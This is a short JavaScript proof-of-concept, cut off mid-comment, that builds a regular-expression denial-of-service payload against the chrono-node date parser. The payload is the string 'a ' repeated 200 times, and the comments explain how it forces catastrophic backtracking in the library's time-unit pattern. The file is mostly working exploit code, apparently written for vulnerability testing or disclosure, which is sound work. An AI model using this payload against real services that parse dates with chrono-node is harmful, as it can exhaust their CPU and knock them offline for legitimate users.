const chrono = require("chrono-node");

async function exploit() {
   // Payload construction triggers catastrophic backtracking in TIME_UNITS_PATTERN.
   // The regex uses overlapping optional quantifiers (a?, \s*) combined with unbounded repetitions (*).
   // A string of repeated "a " forces the engine to repeatedly backtrack through NUMBER_PATTERN 
   // before failing to match a unit word, causing exponential time complexity.
   const payload = "a ".repeat(200);

   console.log("Executing chrono-node parsing on malicious payload...");

   // This invocation forces the regex engine into catastrophic backtracking.
   // It will either burn >100% CPU, exceed the 30,000 backtrack threshold, or crash/timeout 
